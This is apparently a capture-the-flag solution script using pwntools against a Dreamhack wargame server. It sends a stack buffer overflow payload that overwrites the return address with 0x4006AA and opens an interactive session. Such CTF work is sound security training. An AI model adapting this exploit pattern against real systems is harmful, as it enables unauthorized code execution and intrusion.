from pwn import *

p = remote("host3.dreamhack.games", 12142)

payload = b"A" * 0x30
payload += b"B" * 0x8
payload += p64(0x4006AA)

p.sendline(payload)

p.interactive()
